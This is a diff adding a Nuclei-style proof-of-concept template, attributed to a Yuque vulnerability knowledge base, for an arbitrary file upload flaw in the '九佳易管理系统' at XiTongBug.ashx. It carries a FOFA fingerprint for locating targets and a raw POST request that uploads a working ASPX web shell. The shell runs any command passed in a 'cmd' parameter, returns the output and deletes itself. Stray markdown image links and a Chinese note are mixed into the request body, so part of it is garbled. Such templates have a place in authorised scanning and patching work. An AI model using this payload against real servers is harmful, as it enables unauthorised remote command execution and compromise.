@@ -1,0 +1,79 @@
+id: poc-fbl1qqdgktk1onn4
+info:
+  name: 九佳易管理系统 XiTongBug.ashx 存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fbl1qqdgktk1onn4'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fbl1qqdgktk1onn4
+    fofa: body="4008-820-967"
+http:
+- raw:
+  - 'POST /XiTongBug.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Accept: */*
+
+    Connection: close
+
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="1.aspx"
+
+    Content-Type: image/jpeg
+
+
+    <%@ Page Language="Jscript" validateRequest="false" %>
+
+    <%
+
+    var c=new System.Diagnostics.ProcessStartInfo("cmd");
+
+    var e=new System.Diagnostics.Process();
+
+    var out:System.IO.StreamReader,EI:System.IO.StreamReader;
+
+    c.UseShellExecute=false;
+
+    c.RedirectStandardOutput=true;
+
+    c.RedirectStandardError=true;
+
+    e.StartInfo=c;
+
+    c.Arguments="/c " + Request.Item["cmd"];
+
+    e.Start();
+
+    out=e.StandardOutput;
+
+    EI=e.StandardError;
+
+    e.Close();
+
+    Response.Write(out.ReadToEnd() + EI.ReadToEnd());
+
+    System.IO.File.Delete(Request.PhysicalPath);
+
+    Response.End();%>
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1763892401402-34e14f44-20e8-4ebd-825c-ee085323fd50.png)
+
+    回显了绝对路径，进行验证
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1763892401774-f1f8dbe2-90a8-4f5b-a25c-b7e8a87a4156.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
